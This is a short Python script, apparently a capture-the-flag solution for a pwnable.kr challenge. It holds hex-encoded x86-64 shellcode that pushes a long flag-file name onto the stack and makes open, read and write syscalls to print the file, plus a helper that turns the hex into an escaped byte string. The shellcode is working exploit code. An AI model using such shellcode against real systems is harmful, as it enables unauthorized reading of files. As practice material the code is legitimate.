raw = """48 b8 6f 30 6f 30 6f
6e 67 00 
50                  
48 b8 6f 30 6f 30 6f
30 6f 30 
50                  
48 b8 30 30 30 30 30
30 30 30 
50                  
48 b8 6f 6f 6f 6f 30
30 30 30 
50                  
48 b8 6f 6f 6f 6f 6f
6f 6f 6f 
50                  
48 b8 6f 6f 6f 6f 6f
6f 6f 6f 
50                  
48 b8 30 30 30 30 30
6f 6f 6f 
50                  
48 b8 30 30 30 30 30
30 30 30 
50                  
48 b8 30 30 30 30 30
30 30 30 
50                  
48 b8 6f 6f 6f 6f 30
30 30 30 
50                  
48 b8 6f 6f 6f 6f 6f
6f 6f 6f 
50                  
48 b8 6f 6f 6f 6f 6f
6f 6f 6f 
50                  
48 b8 6f 6f 6f 6f 6f
6f 6f 6f 
50                  
48 b8 6f 6f 6f 6f 6f
6f 6f 6f 
50                  
48 b8 6f 6f 6f 6f 6f
6f 6f 6f 
50                  
48 b8 6f 6f 6f 6f 6f
6f 6f 6f 
50                  
48 b8 6f 6f 6f 6f 6f
6f 6f 6f 
50                  
48 b8 6f 6f 6f 6f 6f
6f 6f 6f 
50                  
48 b8 6f 6f 6f 6f 6f
6f 6f 6f 
50                  
48 b8 73 5f 76 65 72
79 5f 6c 
50                  
48 b8 65 5f 6e 61 6d
65 5f 69 
50                  
48 b8 5f 74 68 65 5f
66 69 6c 
50                  
48 b8 6c 65 2e 73 6f
72 72 79 
50                  
48 b8 5f 74 68 69 73
5f 66 69 
50                  
48 b8 61 73 65 5f 72
65 61 64 
50                  
48 b8 66 69 6c 65 5f
70 6c 65 
50                  
48 b8 6b 72 5f 66 6c
61 67 5f 
50                  
48 b8 70 77 6e 61 62
6c 65 2e 
50                  
48 b8 74 68 69 73 5f
69 73 5f 
50                  
48 c7 c0 02 00 00 00
48 89 e7            
48 c7 c6 00 00 00 00
48 c7 c2 00 00 00 00
0f 05      
48 89 c7   
48 89 e6   
48 c7 c2 00 04 00 00
48 c7 c0 00 00 00 00
0f 05               
48 c7 c0 01 00 00 00
48 c7 c7 01 00 00 00
48 89 e6            
0f 05               
"""
out =""
prev = ""
for c in raw:
	if c == '\r' or c == '\n' or c == ' ':
		continue
	prev += c
	if len(prev) == 2:
		# print (prev)
		out += "\\x" + prev
		prev = ""
print (out)